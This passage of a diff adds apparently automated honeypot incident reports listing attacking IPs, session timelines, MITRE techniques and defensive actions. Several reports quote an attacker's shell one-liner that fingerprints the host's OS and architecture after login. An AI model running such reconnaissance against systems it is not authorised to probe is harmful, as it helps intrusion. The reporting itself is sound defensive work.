+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.success` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:42` | `cowrie.command.input` |
+| `2026-08-22 15:08:43` | `cowrie.log.closed` |
+| `2026-08-22 15:08:44` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c10722fcc381
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:09 |
+| **Last Seen** | 2026-08-22 15:09 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:09:29` | `cowrie.session.connect` |
+| `2026-08-22 15:09:29` | `cowrie.client.version` |
+| `2026-08-22 15:09:29` | `cowrie.client.kex` |
+| `2026-08-22 15:09:30` | `cowrie.login.success` |
+| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:09:30` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:09:31` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-127a931fee48
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:09 |
+| **Last Seen** | 2026-08-22 15:09 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:09:39` | `cowrie.session.connect` |
+| `2026-08-22 15:09:39` | `cowrie.client.version` |
+| `2026-08-22 15:09:39` | `cowrie.client.kex` |
+| `2026-08-22 15:09:40` | `cowrie.login.success` |
+| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:09:40` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:09:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5ad91610138a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:10 |
+| **Last Seen** | 2026-08-22 15:10 |
+| **Session Duration** | 13s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:10:05` | `cowrie.session.connect` |
+| `2026-08-22 15:10:06` | `cowrie.client.version` |
+| `2026-08-22 15:10:06` | `cowrie.client.kex` |
+| `2026-08-22 15:10:12` | `cowrie.login.success` |
+| `2026-08-22 15:10:17` | `cowrie.session.params` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.success` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:17` | `cowrie.command.input` |
+| `2026-08-22 15:10:18` | `cowrie.log.closed` |
+| `2026-08-22 15:10:19` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-a9f9ada80349
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `218.58.73[.]238` |
+| **First Seen** | 2026-08-22 15:10 |
+| **Last Seen** | 2026-08-22 15:10 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:10:20` | `cowrie.session.connect` |
+| `2026-08-22 15:10:22` | `cowrie.client.version` |
+| `2026-08-22 15:10:22` | `cowrie.client.kex` |
+| `2026-08-22 15:10:24` | `cowrie.login.success` |
+| `2026-08-22 15:10:25` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:10:31` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
+- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-80c549878ea5
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:11 |
+| **Last Seen** | 2026-08-22 15:12 |
+| **Session Duration** | 15s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:11:51` | `cowrie.session.connect` |
+| `2026-08-22 15:11:52` | `cowrie.client.version` |
+| `2026-08-22 15:11:52` | `cowrie.client.kex` |
+| `2026-08-22 15:11:59` | `cowrie.login.success` |
+| `2026-08-22 15:12:04` | `cowrie.session.params` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.success` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:04` | `cowrie.command.input` |
+| `2026-08-22 15:12:06` | `cowrie.log.closed` |
+| `2026-08-22 15:12:07` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-38c3d18bb502
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `121.22.99[.]2` |
+| **First Seen** | 2026-08-22 15:11 |
+| **Last Seen** | 2026-08-22 15:12 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:11:55` | `cowrie.session.connect` |
+| `2026-08-22 15:11:56` | `cowrie.client.version` |
+| `2026-08-22 15:11:56` | `cowrie.client.kex` |
+| `2026-08-22 15:11:59` | `cowrie.login.success` |
+| `2026-08-22 15:12:00` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:12:05` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
+- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-50543296494d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `135.23.190[.]48` |
+| **First Seen** | 2026-08-22 15:12 |
+| **Last Seen** | 2026-08-22 15:12 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:12:05` | `cowrie.session.connect` |
+| `2026-08-22 15:12:05` | `cowrie.client.version` |
+| `2026-08-22 15:12:05` | `cowrie.client.kex` |
+| `2026-08-22 15:12:06` | `cowrie.login.success` |
+| `2026-08-22 15:12:07` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:12:11` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `135.23.190[.]48` to AbuseIPDB if not already reported
+- [ ] Block `135.23.190[.]48` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-889308134a7a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `210.4.68[.]73` |
+| **First Seen** | 2026-08-22 15:12 |
+| **Last Seen** | 2026-08-22 15:12 |
+| **Session Duration** | 9s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:12:12` | `cowrie.session.connect` |
+| `2026-08-22 15:12:13` | `cowrie.client.version` |
+| `2026-08-22 15:12:13` | `cowrie.client.kex` |
+| `2026-08-22 15:12:15` | `cowrie.login.success` |
+| `2026-08-22 15:12:16` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:12:21` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
+- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3090a7e3f763
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `223.82.86[.]2` |
+| **First Seen** | 2026-08-22 15:12 |
+| **Last Seen** | 2026-08-22 15:12 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:12:22` | `cowrie.session.connect` |
+| `2026-08-22 15:12:22` | `cowrie.client.version` |
+| `2026-08-22 15:12:22` | `cowrie.client.kex` |
+| `2026-08-22 15:12:25` | `cowrie.login.success` |
+| `2026-08-22 15:12:25` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:12:30` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
+- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-fc9106dba560
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:13 |
+| **Last Seen** | 2026-08-22 15:13 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:13:32` | `cowrie.session.connect` |
+| `2026-08-22 15:13:33` | `cowrie.client.version` |
+| `2026-08-22 15:13:33` | `cowrie.client.kex` |
+| `2026-08-22 15:13:36` | `cowrie.login.success` |
+| `2026-08-22 15:13:38` | `cowrie.session.params` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.success` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.command.input` |
+| `2026-08-22 15:13:38` | `cowrie.log.closed` |
+| `2026-08-22 15:13:39` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-66a97350af9a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:15 |
+| **Last Seen** | 2026-08-22 15:15 |
+| **Session Duration** | 11s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:15:21` | `cowrie.session.connect` |
+| `2026-08-22 15:15:23` | `cowrie.client.version` |
+| `2026-08-22 15:15:23` | `cowrie.client.kex` |
+| `2026-08-22 15:15:28` | `cowrie.login.success` |
+| `2026-08-22 15:15:31` | `cowrie.session.params` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.success` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:31` | `cowrie.command.input` |
+| `2026-08-22 15:15:32` | `cowrie.log.closed` |
+| `2026-08-22 15:15:33` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-509cca04062d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:16 |
+| **Last Seen** | 2026-08-22 15:17 |
+| **Session Duration** | 14s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:16:54` | `cowrie.session.connect` |
+| `2026-08-22 15:16:55` | `cowrie.client.version` |
+| `2026-08-22 15:16:55` | `cowrie.client.kex` |
+| `2026-08-22 15:17:04` | `cowrie.login.success` |
+| `2026-08-22 15:17:06` | `cowrie.session.params` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.success` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:06` | `cowrie.command.input` |
+| `2026-08-22 15:17:07` | `cowrie.command.input` |
+| `2026-08-22 15:17:07` | `cowrie.log.closed` |
+| `2026-08-22 15:17:08` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-4f7b8e1f9251
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:18 |
+| **Last Seen** | 2026-08-22 15:18 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:18:28` | `cowrie.session.connect` |
+| `2026-08-22 15:18:28` | `cowrie.client.version` |
+| `2026-08-22 15:18:28` | `cowrie.client.kex` |
+| `2026-08-22 15:18:30` | `cowrie.login.success` |
+| `2026-08-22 15:18:32` | `cowrie.session.params` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.success` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.command.input` |
+| `2026-08-22 15:18:32` | `cowrie.log.closed` |
+| `2026-08-22 15:18:33` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8e49944373e1
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:19 |
+| **Last Seen** | 2026-08-22 15:19 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:19:32` | `cowrie.session.connect` |
+| `2026-08-22 15:19:32` | `cowrie.client.version` |
+| `2026-08-22 15:19:32` | `cowrie.client.kex` |
+| `2026-08-22 15:19:33` | `cowrie.login.success` |
+| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:19:33` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-14fa234afcd5
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:19 |
+| **Last Seen** | 2026-08-22 15:19 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:19:43` | `cowrie.session.connect` |
+| `2026-08-22 15:19:43` | `cowrie.client.version` |
+| `2026-08-22 15:19:43` | `cowrie.client.kex` |
+| `2026-08-22 15:19:44` | `cowrie.login.success` |
+| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:19:44` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-d84ccf5ee349
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:20 |
+| **Last Seen** | 2026-08-22 15:20 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:20:15` | `cowrie.session.connect` |
+| `2026-08-22 15:20:16` | `cowrie.client.version` |
+| `2026-08-22 15:20:16` | `cowrie.client.kex` |
+| `2026-08-22 15:20:21` | `cowrie.login.success` |
+| `2026-08-22 15:20:24` | `cowrie.session.params` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.success` |
